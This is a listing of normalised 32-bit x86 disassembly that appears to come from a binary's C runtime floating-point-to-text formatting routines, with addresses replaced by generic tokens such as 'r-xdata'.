test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10009c32
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
cmp ebx 0xffffc001
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
cmp esi edx
mov [ ebp + 0x8 ] esi
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_1000a174
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100027e4
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1000a1b8
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100027e4
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_1000d9bc
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_1000d87c
test eax eax
movsx eax [ esi ]
push eax
call sub_1000d9bc
cmp eax 0x78
pop ecx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
cmp [ ebp - 0x4 ] cl
pop esi
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1000a229
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100027e4
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
test cl cl
mov esi [ ebp - 0x10 ]
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
test cl cl
mov [ eax ] cl
jne r-xdata
dec eax
sub_1000a2bf
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_1000da89
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_1000d9e3
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_1000a316
test edi edi
push esi
mov esi eax
je r-xdata
pop esi
retn
push esi
call sub_10004ac0
inc eax
push eax
push esi
add esi edi
push esi
call sub_1000c7b0
add esp 0x10
sub_1000a34f
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_100027e4
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_100049cb
push 0x16
cmp [ ebp + 0xc ] esi
jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_100049cb
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_1000a316
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_1000496c
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
lea ecx [ esi + 0x2 ]
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10004870
add esp 0x14
push r--data
push ebx
push esi
call sub_10009649
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_1000c7b0
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_1000a4bc
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1000dca7
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_100049cb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1000496c
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
mov esi [ ebp + 0x14 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100026a8
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_1000a34f
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_1000db2f
add esp 0x10
cmp eax ebx
je r-xdata
sub_1000a5a8
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_100027e4
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_100049cb
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
cmp [ ebp + 0x10 ] eax
mov [ esi ] 0x0
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_100049cb
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_1000496c
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_1000a58a
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
cmp [ ebp + 0x14 ] edx
mov [ ebp + 0xc ] eax
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_1000d800
test eax eax
pop ecx
pop ecx
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_1000de20
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_1000de20
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_10008c10
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_1000de20
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_1000dd40
add al 0x30
mov [ esi ] al
inc esi
cmp esi edi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_1000dd40
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_1000dd40
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_1000a919
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_100027e4
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_100049cb
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000496c
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_1000a316
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_1000a316
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_1000a316
push edi
push 0x30
push esi
call sub_10008c10
add esp 0xc
sub_1000aa0e
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1000dca7
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_100049cb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1000496c
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100026a8
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_1000a919
add esp 0x10
mov [ edi ] bl
jmp r-xdata
